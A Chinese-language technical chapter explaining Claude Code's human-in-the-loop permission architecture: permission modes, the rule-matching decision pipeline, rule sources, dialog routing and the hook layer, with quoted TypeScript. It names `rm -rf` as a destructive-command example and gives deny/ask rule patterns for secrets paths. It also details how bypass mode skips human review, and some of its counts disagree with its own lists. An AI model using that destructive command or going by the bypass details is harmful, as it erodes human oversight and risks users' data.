---
description: "HITL 不是独立子系统，而是寄生在 Agent 循环上的闸门——在安全性、可用性、可恢复性三个冲突目标间找平衡。本章拆四类权限模式如何定基调、hasPermissionsToUseTool 决策管线如何逐层放行或弹窗、always allow 如何持久化，以及 headless 模式如何降级兜底。"
---

# 人在环路（Human-in-the-Loop）

> **本章目标**：理解 Claude Code 的 HITL 体系——Agent 如何在"该问什么、不该问什么"之间做权衡，权限管线如何决定每个工具调用是放行、拒绝还是弹窗，UI 弹窗如何按工具类型路由，以及 headless 环境下如何安全降级。
>
> **读完本章你应该能回答**：
> - 四类权限模式（default/acceptEdits/bypassPermissions/dontAsk/plan/auto）分别在什么场景使用，行为有何不同？
> - `hasPermissionsToUseToolInner` 完整决策管线经历哪几个步骤？每步做什么？
> - `useCanUseTool` 和 `hasPermissionsToUseTool` 是什么关系？为什么要分两层？
> - 用户选择 `always allow` 后，规则持久化到哪个文件？不同 destination 有何区别？
> - 非交互模式下，权限弹窗如何降级？默认是 allow 还是 deny？

**文章结构**：

| 章节 | 所属大块 | 内容 | 阅读建议 |
|------|---------|------|---------|
| 一 | 引言 | HITL 要解决的核心问题：安全性 vs 可用性 vs 可恢复性 | 必读，建立问题意识 |
| 二 | 引言 | HITL 在架构中的位置：纵贯多层的调用栈 | 必读，建立全局坐标 |
| 三 | 宏观块 | 系统完整样貌：端到端全景链路、核心抽象、版图分类、注册机制、对外接口 | 必读，建立心智模型 |
| 四 | 核心细节块 | 沿一次工具调用生命周期的运行时细节：从 deny rule 到持久化降级 | **核心章节**，理解每个机制的"为什么→怎么做→实例" |
| 五 | 收束 | 设计决策与权衡 | 理解为什么这样设计 |
| 六 | 收束 | 边界与局限 | 了解当前实现的不足 |
| 七 | 收束 | 可复用的模式 | 提炼可迁移的设计模式 |

**配套阅读标注**：

- 本文聚焦 Claude Code 的交互式权限体系。其中"方案审批"涉及 Plan Mode，细节请配合 [11-plan-mode](cc-11-plan-mode-deep-dive.md) 阅读，本文只在版图分类中给出接口对照。
- 文中所有 `file:line` 引用均基于本仓库源码，可对照阅读；宏观块（第三章）建立心智模型即可，不必逐行对照；核心细节块（第四章）建议对照源码逐段验证。
- 全文围绕"一次工具调用"展开：宏观块回答"系统长什么样"，核心细节块回答"这一次调用从进来到结束经历了什么"。

---

## 一、它在解决什么问题

Agent 不是全能的，某些决策需要人的判断：危险操作确认（`rm -rf`）、架构方案审批、权限规则设置。HITL 的核心问题是：**什么该问、什么不该问、问了之后怎么记住答案、不回答时怎么办。**

更进一步，HITL 要在三个相互冲突的目标之间取得平衡：

- **安全性**（不能让 Agent 偷偷执行 `rm -rf`）
- **可用性**（不能每次 `git status` 都弹窗打断）
- **可恢复性**（headless / 管道模式下不能直接崩溃）

这三者天然冲突：安全性要求多问，可用性要求少问，可恢复性要求"问不了也不能崩"。不同任务的"必要介入点"差异极大——一行 typo 修改不需要审批，整库重构必须先看方案。HITL 体系的全部设计，本质上都是在为这三者寻找可调节的平衡点：用权限模式做"全局基调"，用规则做"细粒度刻度"，用弹窗做"最后一道人审"，用持久化做"记忆"，用降级策略做"问不了时的兜底"。

本文档聚焦 Claude Code 的 HITL 体系：四类权限模式、统一的审批决策管线、UI 弹窗组件树、决策持久化机制、以及 headless 环境的降级策略。

**本章建立了"问题意识"，但还没说清这套机制在 Claude Code 整体架构中处于什么位置——下一章给出 HITL 的分层坐标与调用栈。**

---

## 二、它放在架构的哪个位置

上一章讲清楚了 HITL 要平衡的三个目标，这一章回答"这套平衡机制在系统里挂在哪"。

上一章讲 Agent 循环是系统的中枢，所有功能围绕它运转。HITL 是循环中一个特殊的"暂停点"——当遇到需要人决策的操作时，循环会停下来等待用户输入，然后再继续。理解这个"暂停点"的定位，是理解后面所有机制的前提：HITL 不是独立的子系统，而是寄生在 Agent 循环上的"闸门"。

HITL 不是单一函数，而是分布在多个层中的协作机制：

```
┌─────────────────────────────────────────────────────────────────┐
│                     HITL 分层架构                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  决策逻辑层 ─── hasPermissionsToUseToolInner()                   │
│  (src/utils/permissions/permissions.ts)                         │
│    └─► 规则匹配 + 模式检查 + 工具自定义逻辑                       │
│                                                                  │
│  展示逻辑层 ─── useCanUseTool() hook                             │
│  (src/hooks/useCanUseTool.tsx)                                  │
│    └─► 弹窗展示 + 用户交互 + 决策回流                            │
│                                                                  │
│  UI 组件层 ─── PermissionRequest 组件树                          │
│  (src/components/permissions/)                                  │
│    └─► 按工具路由的弹窗 UI                                       │
│                                                                  │
│  持久化层 ─── persistPermissionUpdates()                         │
│  (src/utils/permissions/PermissionUpdate.ts)                    │
│    └─► 写入 settings.json / session 内存                          │
│                                                                  │
│  Hook 扩展层 ── PermissionRequest hook                          │
│  (src/hooks/hooks.ts)                                           │
│    └─► 企业级权限决策拦截                                        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

这五层不是"流水线"，而是"同一件事的不同视角"：决策逻辑层回答"该不该问"，展示逻辑层回答"怎么问、怎么收回答案"，UI 组件层回答"问的界面长什么样"，持久化层回答"答案记在哪"，Hook 扩展层回答"企业能不能插队先答"。一次工具调用会贯穿这五层，但每层各司其职。

完整的 HITL 调用栈：

```
Agent Loop ──► tool_use 触发
                  │
                  ▼
            useCanUseTool() (src/hooks/useCanUseTool.tsx)
                  │
                  ├─► hasPermissionsToUseTool() (src/utils/permissions/permissions.ts)
                  │     │
                  │     ├─► hasPermissionsToUseToolInner()
                  │     │     ├─► 规则匹配（deny/allow/ask rules）
                  │     │     ├─► tool.checkPermissions() — 工具自定义逻辑
                  │     │     └─► 返回 PermissionDecision
                  │     │
                  │     └─► auto mode: classifyYoloAction() (LLM 分类器)
                  │
                  ├─► result.behavior === 'ask'  ──► 展示权限弹窗
                  │     │
                  │     ├─► handleInteractivePermission()  (interactiveHandler.ts)
                  │     ├─► setToolUseConfirmQueue()       (REPL state)
                  │     └─► PermissionRequest 组件
                  │           ├─► permissionComponentForTool()  — 按工具路由
                  │           │     ├─► BashTool → BashPermissionRequest
                  │           │     ├─► FileEditTool → FileEditPermissionRequest
                  │           │     ├─► FileWriteTool → FileWritePermissionRequest
                  │           │     ├─► WebFetchTool → WebFetchPermissionRequest
                  │           │     ├─► EnterPlanModeTool → EnterPlanModePermissionRequest
                  │           │     ├─► ExitPlanModeV2Tool → ExitPlanModePermissionRequest
                  │           │     └─► FallbackPermissionRequest
                  │           │
                  │           └─► 用户决策 ──► onAllow / onReject
                  │                 │
                  │                 ├─► persistPermissionUpdates() — 写入 settings
                  │                 └─► setAppState() — 更新 React state
                  │
                  ├─► result.behavior === 'deny' ──► 直接拒绝
                  │     └─► 返回 is_error=true 给 Agent
                  │
                  └─► result.behavior === 'allow' ──► 直接执行
```

HITL 不是单一函数，而是一组**纵贯多个层**的协作机制：决策逻辑在工具管线层（`hasPermissionsToUseTool`），展示逻辑在 UI 层（`PermissionRequest` 组件树），持久化逻辑在状态层（`persistPermissionUpdates` + `applyPermissionUpdates`），hook 拦截在 hook 层（`PermissionRequest` hook）。

**到此我们有了 HITL 的分层坐标，但每一层内部长什么样、有哪些核心概念、彼此如何拼装——还缺一张完整的心智地图。下一章从宏观角度把这套系统的完整样貌一次铺开。**

---

## 三、宏观看系统完整样貌

上一章给出了 HITL 的分层坐标，但那只是"骨架"。这一章把血肉填上：先给一张端到端全景图建立心智模型，再从链路、抽象、分类、注册、接口五个侧面逐一展开。读完这一章，你应该能在不看代码的情况下说清"一次工具调用会经过哪些环节、用到哪些概念、由谁注册、对外暴露什么"。

### 3.0 端到端全景图：建立心智模型

把第二章的分层架构和调用栈合并成一张图，就是 HITL 的端到端全景。这张图是后续所有展开的"地图"——每个侧面都是对这张图某个维度的放大：

```
                         ┌─────────────────────────────────────┐
                         │          Agent Loop                 │
                         │   tool_use 触发  ──►  暂停循环       │
                         └──────────────┬──────────────────────┘
                                        │
                                        ▼
        ┌───────────────────────────────────────────────────────────┐
        │  对外接口层（第四章 4.1 入口）                                │
        │  useCanUseTool()  ──动态、UI 集成的 React hook              │
        │      │                                                     │
        │      └─► hasPermissionsToUseTool()  ──静态、纯逻辑          │
        └───────────────────────────┬───────────────────────────────┘
                                     │
                                     ▼
        ┌───────────────────────────────────────────────────────────┐
        │  决策管线 hasPermissionsToUseToolInner()（第四章 4.2–4.7）   │
        │                                                           │
        │   ① deny rule  ──► ② ask rule  ──► ③ tool.checkPermissions│
        │                                                           │
        │   ④ bypass/acceptEdits 模式短路                            │
        │                                                           │
        │   ⑤ always allow rule  ──► ⑥ passthrough→ask 兜底          │
        │                                                           │
        │   ⑦ auto mode: classifyYoloAction() LLM 分类器（外层）      │
        └───────────────────────────┬───────────────────────────────┘
                                     │
                ┌────────────────────┼────────────────────┐
                ▼                    ▼                    ▼
            allow                 deny                   ask
            直接执行           is_error=true              │
                                                  ┌──────┴───────┐
                                                  ▼              ▼
                                    交互模式（TTY）         非交互（headless）
                                      │                       │
                                      ▼                       ▼
                              PermissionRequest         默认 DENY 降级
                              组件树（按工具路由）        + Hook 备选
                                      │
                                      ▼
                              用户决策 allow/always/deny
                                      │
                                      ▼
                          ┌───────────┴───────────┐
                          ▼                       ▼
                  persistPermissionUpdates   applyPermissionUpdates
                  （写 settings/内存）        （更新 React state）
```

这张图把"一次工具调用从触发到落地"的全部路径压缩进一屏。下面的五个侧面，分别是对这张图的横向（链路）、纵向（抽象）、归类（分类）、装配（注册）、边界（接口）展开。

### 3.1 全景链路：一次工具调用经过哪些层

链路层面，HITL 是一个"漏斗"——入口是 Agent 的 tool_use，出口是 allow/deny/ask 三选一，中间层层过滤。链路的关键不是"有几层"，而是"每层的职责边界"：

- **对外接口层**（`useCanUseTool` / `hasPermissionsToUseTool`）：决定"谁来问、问谁"。前者是 React hook，能弹窗；后者是纯函数，只能算。
- **决策管线层**（`hasPermissionsToUseToolInner`）：决定"该不该放行"。这是规则与模式的决战之地，七步过滤。
- **交互展开层**（`PermissionRequest` 组件树 + `handleInteractivePermission`）：决定"怎么问、问什么"。按工具路由到不同弹窗。
- **决策落地层**（`persistPermissionUpdates` + `applyPermissionUpdates`）：决定"答案记哪、怎么让后续调用立刻生效"。
- **环境降级层**（`shouldAvoidPermissionPrompts` 分支 + `PermissionRequest` hook）：决定"问不了时怎么办"。

链路的一个易被忽略的特性是"早返回"：决策管线七步中任何一步匹配成功就立即返回，不会走到下一步。这意味着规则的优先级是"物理顺序"决定的——deny 永远先于 allow 先于 ask，不存在"allow 之后又被 deny 覆盖"的情况。这个特性是后面"为什么 deny rule 免疫 bypass"的根因。

### 3.2 核心抽象：贯穿全系统的五个概念

HITL 的代码量不小，但真正贯穿全系统的核心抽象只有五个。理解了它们，读代码就不会在类型间迷路。

**① PermissionMode——全局基调**

权限模式是一个枚举，控制"默认放行还是弹窗"。六个值在 `src/utils/permissions/PermissionMode.ts:41-86` 定义（详见 3.3）。它的本质是"减少决策维度的开关"：没有模式时，每个工具调用都要单独决策；有了模式，一类调用可以批量决定。模式是粗粒度的，规则是细粒度的，二者配合。

**② PermissionDecision——决策结果**

决策管线最终产出一个 `PermissionDecision`，核心字段是 `behavior: 'allow' | 'deny' | 'ask'`。但仅有 behavior 不够——还要带 `decisionReason`（为什么这么决定）、`message`（弹窗显示什么）、`updatedInput`（工具可能改写输入，如沙箱化后的命令）。`decisionReason` 的 type 字段（`rule` / `mode` / `safetyCheck` / `classifier` / `asyncAgent`）尤其关键，它决定了后续是否走特殊路径（如 safetyCheck 在 headless 下强制 deny）。

**③ PermissionUpdate——决策的"记忆单位"**

用户在弹窗里选"always allow"后，系统生成一个 `PermissionUpdate`（`src/utils/permissions/PermissionUpdateSchema.ts`）。它描述"把什么规则、以什么行为、写到哪个目的地"：`{ type: 'addRules', rules, behavior, destination }`。destination（见 ④）决定它活多久、对谁可见。临时 allow 和 always allow 的全部区别，就在 destination 一个字段。

**④ destination——记忆的"生命周期 + 可见范围"**

destination 是 PermissionUpdate 的灵魂字段，可选值：`session`（内存）、`userSettings`（`~/.claude/settings.json`）、`projectSettings`（`<project>/.claude/settings.json`）、`localSettings`（`<project>/.claude/settings.local.json`，不进 git）、`cliArg`（`--allowedTools`）、`command`（slash command）。它同时编码了两个正交维度——生命周期（内存 vs 磁盘）和可见范围（本机 / 本项目 / 团队 / 全局）。用户选"always allow"时其实是在选 destination，只是 UI 把它包装成了"是/否"问题。

**⑤ ToolPermissionContext——决策管线的"全部输入"**

`hasPermissionsToUseTool` 是纯函数，它的全部信息来自 `ToolPermissionContext`：当前 mode、按 source 分组的三类规则（allow/deny/ask）、以及若干布尔标志（`isBypassPermissionsModeAvailable`、`shouldAvoidPermissionPrompts` 等）。这个设计的好处是"决策可复现"——同样的 context + tool + input 永远得到同样的 decision，不依赖任何外部状态。这也是它能在单测、coordinator worker、swarm worker 等多场景复用的根因。

```typescript
// src/types/permissions.ts — ToolPermissionContext 的关键字段
type ToolPermissionContext = {
  mode: PermissionMode               // 当前模式（default/plan/acceptEdits/...）
  alwaysAllowRules: {                // 按 source 分组的 allow rules
    userSettings: string[]
    projectSettings: string[]
    localSettings: string[]
    session: string[]
    cliArg: string[]
    command: string[]
  }
  alwaysDenyRules: { ... }           // 同上
  alwaysAskRules: { ... }           // 同上
  isBypassPermissionsModeAvailable: boolean
  shouldAvoidPermissionPrompts: boolean  // headless 模式
  // ...
}
```

### 3.3 版图分类：六类权限模式与六类 HITL 触发

HITL 体系里有两套"分类"，容易混：一套是权限模式（全局基调），一套是 HITL 触发类型（什么场景会问人）。把它们放在一起对照，能避免后续读代码时把"模式"和"触发"搞混。

**权限模式（PermissionMode）——全局基调**

```typescript
// src/utils/permissions/PermissionMode.ts:41-86
const PERMISSION_MODE_CONFIG: Partial<Record<PermissionMode, PermissionModeConfig>> = {
  default: {
    title: 'Default',
    shortTitle: 'Default',
    symbol: '',
    color: 'text',
    external: 'default',
  },
  plan: {
    title: 'Plan Mode',
    shortTitle: 'Plan',
    symbol: PAUSE_ICON,
    color: 'planMode',
    external: 'plan',
  },
  acceptEdits: {
    title: 'Accept edits',
    shortTitle: 'Accept',
    symbol: '⏵⏵',
    color: 'autoAccept',
    external: 'acceptEdits',
  },
  bypassPermissions: {
    title: 'Bypass',
    shortTitle: 'Bypass',
    symbol: '⏵⏵',
    color: 'error',
    external: 'bypassPermissions',
  },
  dontAsk: {
    title: "Don't Ask",
    shortTitle: 'DontAsk',
    symbol: '⏵⏵',
    color: 'error',
    external: 'dontAsk',
  },
  auto: {
    title: 'Auto',
    shortTitle: 'Auto',
    symbol: '⏵⏵',
    color: 'warning',
    external: 'default',  // auto 不暴露给外部用户
  },
}
```

注意 `auto` 模式的 `external` 字段是 `default`——它对外部用户不可见，只有 ant 内部能用。这是因为 auto 模式使用了 LLM 分类器判断操作安全性，外部用户使用会有成本和潜在风险问题。

各模式的使用场景与决策行为：

| 模式 | 使用场景 | 工具调用行为 | 头部状态指示 | 切换方式 |
|------|---------|------------|------------|---------|
| `default` | 日常开发（最常用） | 未知工具 → ASK；已知规则 → 规则决定 | 无特殊符号 | `/permissions` → 选择 |
| `acceptEdits` | 让 Agent 自由修改代码（CI 自动化、Code Review 后续修改） | 文件编辑类工具自动 ALLOW；其他工具仍需 ASK | `⏵⏵` 蓝色 | `--permission-mode acceptEdits` |
| `bypassPermissions` | 完全无人值守（管道模式、cron 任务执行） | 所有工具直接 ALLOW（绕过 HITL） | `⏵⏵` 红色（警告色） | `--permission-mode bypassPermissions` |
| `dontAsk` | headless 但希望严格（默认拒绝而非默认允许） | 未知工具 → DENY；已知规则 → 规则决定 | `⏵⏵` 红色 | `--permission-mode dontAsk` |
| `plan` | 先方案后执行（详见 [11-plan-mode](cc-11-plan-mode-deep-dive.md)） | 写工具被 deny rules 锁定；只读工具可用 | `PAUSE_ICON` 紫色 | `/plan` 或 `--permission-mode plan` |
| `auto` | ant 内部：用 LLM 分类器判断操作安全性 | 未知工具 → 调用 Haiku 分类器；高置信 allow/deny 自动执行 | `⏵⏵` 黄色（警告） | ant-only，未对外部开放 |

**acceptEdits 的特殊定位**：它最容易被误解为"所有工具自动 ALLOW"，实际是**只对文件编辑类工具（FileEdit/FileWrite/NotebookEdit/SedEdit）自动 ALLOW**，其他工具（Bash/WebFetch/MCP 工具）仍走标准 ASK 流程。这个取舍背后是"风险信号的可观测性"差异：

- 文件编辑的"风险信号"清晰：diff 可见、人工 review 容易
- 文件编辑的"误操作代价"可控：git 可回退、build 可失败捕获
- 而 Bash 命令可能是 `rm -rf`、WebFetch 可能访问恶意 URL，分类更困难

auto 模式下还会用 `acceptEdits` 作为 fast-path 优化（`permissions.ts:599-655`）：在调用 LLM 分类器前，先用 acceptEdits 模式检查一遍——若 `tool.checkPermissions()` 在 acceptEdits 下返回 allow，则直接放行，跳过昂贵的分类器 API 调用。这里的成本账很直接：一次 Haiku 调用约几十毫秒加 token 费用，而文件编辑在 acceptEdits 下本就该放行，先用 fast-path 试一次能省掉绝大多数分类器开销。

**bypassPermissions 的"safety net"机制**：bypassPermissions 看似"完全无人值守"，但有两个免疫例外：

1. **deny rules 仍然生效**（`permissions.ts:1192-1202`）：用户显式 deny 的工具即使在 bypass 模式下也拒绝——这是用户的"硬底线"。
2. **safetyCheck 仍然触发 ASK**（`permissions.ts:1273-1281`）：保护 `.git/`、`.claude/`、`.vscode/`、shell 配置文件等敏感路径，即使在 bypass 模式下也弹窗确认。
3. **content-specific ask rules 仍然生效**（`permissions.ts:1259-1271`）：如 `Bash(npm publish:*)` 这样的内容级 ask rule，即使在 bypass 下也弹窗。

这种"分层免疫"的设计确保了 bypass 模式的"危险"标签（color: 'error'）名副其实——用户开启 bypass 时清楚地知道自己在做什么，但仍有一些安全网。

**HITL 触发类型——什么场景会问人**

权限模式是"默认行为"，但在实际运行中，哪些操作会真的触发弹窗？HITL 触发点分为三类：

1. **权限审批**——最常见，每次工具调用都会经过权限管线检查
2. **方案审批**——Plan Mode 结束时触发，用户审查完整方案
3. **危险操作确认**——auto mode 下，分类器判定高风险操作时额外确认

完整的触发流程：

```
用户输入
  │
  ▼
Agent Loop ──► tool_use 触发
                  │
                  ▼
            hasPermissionsToUseToolInner() (权限管线)
                  │
                  ├─► deny rule 匹配 → DENY（无人介入）
                  ├─► ask rule 匹配 → ASK（弹窗）
                  ├─► bypass 模式 + safetyCheck 免疫 → ASK（弹窗）
                  ├─► bypass 模式 + 无免疫 → ALLOW（无人介入）
                  ├─► always allow rule 匹配 → ALLOW（无人介入）
                  ├─► auto classifier → 自动判断（无人介入）
                  │
                  └─► 默认 ASK ──► 权限弹窗（PermissionDialog）
                        │              ├─ allow (本次)
                        │              ├─ always allow (持久化)
                        │              └─ deny (本次)
                        │
                        ▼
                  Plan Mode: ExitPlanModeV2Tool
                        │
                        └─► 用户审查 PLAN.md → approve/reject
                              │
                              ▼
                  危险操作: classifier 判定
                        │
                        └─► 高风险操作 → 额外确认
```

六类 HITL 的横向对比：

| 类型 | 触发条件 | 决策选项 | 持久化策略 | 非交互降级 | 关键代码 |
|------|---------|---------|-----------|-----------|---------|
| 权限审批 | 工具无匹配 allow/deny 规则 | allow / always allow / deny | always allow → 持久化到 settings | deny（管道模式） | `permissions.ts:1179-1340` |
| 方案审批 | Plan Mode 结束 | approve / reject | 不持久化（一次性） | 不适用（Plan Mode 需要交互） | `ExitPlanModeV2Tool.ts` |
| 危险操作确认 | classifier 判定高风险 | confirm / cancel | 不持久化 | deny | `permissionSetup.ts` |
| 权限规则编辑 | 用户通过 `/permissions` 或命令 | add / remove / replace rules | 持久化到 settings.json | 不适用 | `permissions.ts:1350-1424` |
| Trust dialog | 首次启动 | accept / decline | 持久化到 config | 不适用 | `init.ts` |
| Hook 拦截 | `PermissionRequest` hook 返回结果 | allow / deny | hook 自定义 | hook 自定义 | `hooks.ts` + `permissions.ts:400-471` |

把"模式"和"触发"分清后，一个常见困惑就消解了：bypassPermissions 是模式，它改变的是"权限审批"这一类触发的默认行为，但不会消除"方案审批"等其他触发——这就是为什么 bypass 下仍然可能弹窗。

### 3.4 注册机制：弹窗组件路由、Hook 扩展点、规则 Source

HITL 不是一个写死的系统，而是"可插拔"的——弹窗组件、企业 hook、规则来源都是注册进去的。这一节回答"系统的各个部件是怎么挂上去的"。

**弹窗组件路由：tool → dialog 的 switch 注册**

UI 层的权限弹窗是一棵组件树，根组件是 `PermissionRequest`，按工具类型路由到不同子组件。每个工具有自己专属的弹窗，因为不同工具的"风险信号"展示方式完全不同：

```typescript
// src/components/permissions/PermissionRequest.tsx:75-110
function permissionComponentForTool(tool: Tool): React.ComponentType<PermissionRequestProps> {
  switch (tool) {
    case FileEditTool:    return FileEditPermissionRequest
    case FileWriteTool:   return FileWritePermissionRequest
    case BashTool:        return BashPermissionRequest
    case PowerShellTool:  return PowerShellPermissionRequest
    case WebFetchTool:    return WebFetchPermissionRequest
    case NotebookEditTool:return NotebookEditPermissionRequest
    case ExitPlanModeV2Tool: return ExitPlanModePermissionRequest
    case EnterPlanModeTool:  return EnterPlanModePermissionRequest
    case SkillTool:       return SkillPermissionRequest
    case AskUserQuestionTool: return AskUserQuestionPermissionRequest
    case GlobTool:
    case GrepTool:
    case FileReadTool:    return FilesystemPermissionRequest
    default:              return FallbackPermissionRequest
  }
}
```

这是一个典型的"显式注册表"模式——新增工具时在这里加一行 case 即可。它没有用注解或反射，是因为工具集合是有限且稳定的，显式 switch 比动态注册更易读、更易调试。每个工具对应一个专门的弹窗组件，因为不同工具的"风险信号"差异巨大：

- Bash 需要显示完整命令（`renderToolUseMessage`）和警告信息（`destructiveWarning`）
- FileEdit/Write 需要显示 diff（`FileEditToolDiff`）
- ExitPlanMode 需要显示完整 plan（`PLAN.md` 内容）
- Fallback 用于未识别的工具（如 MCP 工具）——只显示工具名和参数

所有工具弹窗共享同一个 `PermissionDialog` 框架（`src/components/permissions/PermissionDialog.tsx`），它提供统一的边框、标题、颜色编码，子组件只填充 `children`：

```typescript
// PermissionDialog.tsx — 通用对话框容器
<Box
  flexDirection="column"
  borderStyle="round"
  borderColor={color}      // 'permission' | 'planMode' | 'autoAccept' | 'error' | 'warning'
  borderLeft={false}
  borderRight={false}
  borderBottom={false}
  marginTop={1}
>
  <Box paddingX={1} flexDirection="column">
    <Box justifyContent="space-between">
      <PermissionRequestTitle title={title} subtitle={subtitle} color={titleColor} workerBadge={workerBadge} />
      {titleRight}
    </Box>
  </Box>
  <Box flexDirection="column" paddingX={innerPaddingX}>
    {children}  // 工具特定的内容
  </Box>
</Box>
```

颜色编码（`PermissionMode.ts:134-136` 的 `getModeColor()`）不是装饰，而是"风险等级的视觉编码"：

- `text`（白色）— default 模式
- `planMode`（紫色）— Plan Mode 弹窗
- `autoAccept`（蓝色）— acceptEdits 模式
- `error`（红色）— bypass/dontAsk 模式
- `warning`（黄色）— auto 模式

紫色/蓝色/红色/黄色的递进，对应"方案/低风险/高危/AI 不确定"四种心智——用户扫一眼边框颜色就能预判这次操作的份量，而不必读完弹窗文字。

**Hook 扩展点：企业权限决策的插队入口**

除了内置决策，HITL 还通过 `PermissionRequest` hook 给企业部署留出扩展点（`src/hooks/hooks.ts` + `permissions.ts:400-471`）。hook 是"插队机制"——在正常决策之前或之后，企业可以注入自己的决策逻辑。这个机制是后面 4.11 节 headless 降级的备选方案，也是企业做统一权限审计的挂载点。它的具体运行时行为在第四章降级路径中展开。

**规则 Source：多来源规则的注册与合并**

权限规则不是存在一个文件里，而是从多个 source 注册进来，再按优先级合并。Source 列表在 `permissions.ts:109-114`：

```typescript
// permissions.ts:109-114
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES,  // userSettings, projectSettings, localSettings, policySettings, flagSettings
  'cliArg',
  'command',
  'session',
] as const
```

`SETTINGS_SOURCES` 的顺序（低到高优先级）：

- `policySettings`（企业强制，最先匹配）
- `userSettings`（用户全局）
- `projectSettings`（项目共享）
- `localSettings`（项目本地）
- `flagSettings`（flag 启用）
- `cliArg`（CLI 参数）
- `command`（slash command）
- `session`（运行时）

这个优先级顺序背后的意图是"越靠近运行时、越特例的规则优先级越高"：企业 policy 最先匹配（安全底线），用户全局次之，项目级覆盖用户级（项目可能有自己的安全要求），本地 localSettings 覆盖项目级（个人临时调整但不进 git），而 cliArg/command/session 是"本次运行才生效"的临时规则，优先级最高——因为它们最贴近"用户此刻的意图"。高优先级 source 的规则优先匹配。`getAllowRules()`（`permissions.ts:122-132`）按顺序展开规则数组，匹配时按数组顺序找第一个命中的——因此 source 顺序决定了"覆盖"关系。

规则匹配的核心算法 `toolMatchesRule()`（`permissions.ts:238-269`）支持三级匹配：

```typescript
function toolMatchesRule(tool, rule): boolean {
  // 1. 整个工具级匹配（ruleContent 未定义）
  if (rule.ruleValue.ruleContent !== undefined) return false
  
  const nameForRuleMatch = getToolNameForPermissionCheck(tool)
  
  // 2. 直接 toolName 匹配
  if (rule.ruleValue.toolName === nameForRuleMatch) return true
  
  // 3. MCP server-level 匹配（mcp__server1 匹配 mcp__server1__tool1）
  const ruleInfo = mcpInfoFromString(rule.ruleValue.toolName)
  const toolInfo = mcpInfoFromString(nameForRuleMatch)
  return (
    ruleInfo !== null && toolInfo !== null &&
    (ruleInfo.toolName === undefined || ruleInfo.toolName === '*') &&
    ruleInfo.serverName === toolInfo.serverName
  )
}
```

三级匹配的意图是"既能精细到单个工具，又能批量管一个 MCP server"：第 1 级匹配整个工具（如 deny 所有 `Bash`），第 2 级按名字精确匹配，第 3 级是 MCP server 级匹配——写一条 `mcp__server1` 规则就能覆盖 `mcp__server1__tool1`、`mcp__server1__tool2` 等所有工具，省去逐工具配置。

注意 MCP skip-prefix mode 的处理（`getToolNameForPermissionCheck`）：在 `CLAUDE_AGENT_SDK_MCP_NO_PREFIX` 模式下，MCP 工具的显示名是 unprefixed（如 `Write`），可能与 builtin `Write` 工具冲突——匹配 builtin 规则时不能误匹配 MCP 替换品。

除了工具级匹配，还有 content-specific 规则——`getRuleByContentsForTool()`（`permissions.ts:349-389`）按 `ruleContent` 索引规则，用于内容级匹配：

- `Bash(npm test:*)` — 匹配所有以 `npm test` 开头的命令
- `Read(/Users/me/secrets/**)` — 匹配 secrets 目录下所有读
- `WebFetch(domain:github.com)` — 匹配访问 github.com 的请求

Bash 的 content-specific 匹配在 `shellRuleMatching.ts` 中实现，支持精确字符串、prefix 通配符、glob 模式等。

### 3.5 对外接口：useCanUseTool 与 hasPermissionsToUseTool 的双层分工

注册机制回答"部件怎么挂"，对外接口回答"外部怎么调"。Claude Code 的 HITL 有两层对外接口——一个负责"纯逻辑判断"，一个负责"UI 集成"。理解这两层的分工，是理解后面运行时细节的前提。

**静态权限配置（hasPermissionsToUseTool）——纯函数式决策**

`hasPermissionsToUseTool()` 是**纯函数式**决策——给定 `tool`、`input`、`context`（包含规则和模式），返回 `PermissionDecision`。它的所有信息都来自 `ToolPermissionContext`（见 3.2 节 ⑤）。这个函数**不调用 UI、不写文件**，是纯逻辑判断。同步性也是它的优势——可以在任何上下文调用，不会被 React state 影响。

**动态回调（useCanUseTool）——React hook 集成**

`useCanUseTool()` 是**React hook**，封装了完整的 HITL 流程：

```typescript
// src/hooks/useCanUseTool.tsx:46-292
function useCanUseTool(setToolUseConfirmQueue, setToolPermissionContext): CanUseToolFn {
  return useCallback<CanUseToolFn>(async (tool, input, toolUseContext, assistantMessage, toolUseID, forceDecision) => {
    return new Promise(resolve => {
      const ctx = createPermissionContext(tool, input, toolUseContext, assistantMessage, toolUseID, ...)

      const decisionPromise =
        forceDecision !== undefined
          ? Promise.resolve(forceDecision)
          : hasPermissionsToUseTool(tool, input, toolUseContext, assistantMessage, toolUseID)

      return decisionPromise.then(async result => {
        if (result.behavior === 'allow') {
          // 1. 直接允许 → resolve(allow)
          // 2. 记录 denial tracking（如 auto mode 下需要重置连续拒绝计数）
          resolve(ctx.buildAllow(...))
          return
        }

        switch (result.behavior) {
          case 'deny':
            // 直接拒绝
            resolve(result)
            return

          case 'ask':
            // 关键路径：展示弹窗
            // - 先尝试 coordinator workers 自动化检查
            // - 再尝试 swarm workers 转发到 leader
            // - 然后等待 speculative classifier grace period (2s)
            // - 最后展示交互弹窗
            handleInteractivePermission(...)
        }
      })
    })
  }, [...])
}
```

注意 `forceDecision` 参数——它允许测试和某些特殊路径绕过正常决策逻辑。这在 REPL 测试和 coordinator worker 自动化检查中非常有用：测试时不需要真走规则匹配，worker 间转发时也不需要重复决策。

这里注释提到的 `speculative classifier grace period (2s)` 是一个常量背后的设计意图：auto mode 下，弹窗不会立即弹出，而是先等 2 秒——给"投机性分类器"（speculative classifier）一个机会在后台异步判断。如果分类器在 2 秒内返回高置信结果，弹窗就被"取消"，用户无需介入；超时才真正弹窗。这个 2 秒是"用户感知延迟"和"分类器命中率"之间的权衡——太短则分类器来不及返回、弹窗频繁；太长则用户觉得卡顿。2 秒是经验值，能让大多数常见安全操作被分类器拦截在弹窗之前。

**两者的协作关系**

```
useCanUseTool (动态、UI 集成)
    │
    ├─► 内部调用 hasPermissionsToUseTool (静态、纯逻辑)
    │     │
    │     └─► 返回 PermissionDecision
    │
    └─► 根据 decision.behavior 分流
          ├─► 'allow' → 直接执行
          ├─► 'deny' → 返回 is_error=true
          └─► 'ask'  → 展示弹窗，等待用户决策
                │
                └─► 用户决策 → onAllow / onReject
                      ├─► persistPermissionUpdates()  // 写入 settings
                      ├─► applyPermissionUpdates()    // 更新 React state
                      └─► resolve(decision)
```

**为什么要分两层？**

- **测试友好**：`hasPermissionsToUseTool` 是纯函数，可在单测中覆盖各种 rule/mode 组合，不必渲染 React。
- **关注点分离**：决策逻辑（哪些规则匹配、应该 ASK 还是 ALLOW）与 UI 逻辑（弹窗显示、用户交互）独立，决策逻辑的变更不会波及 UI。
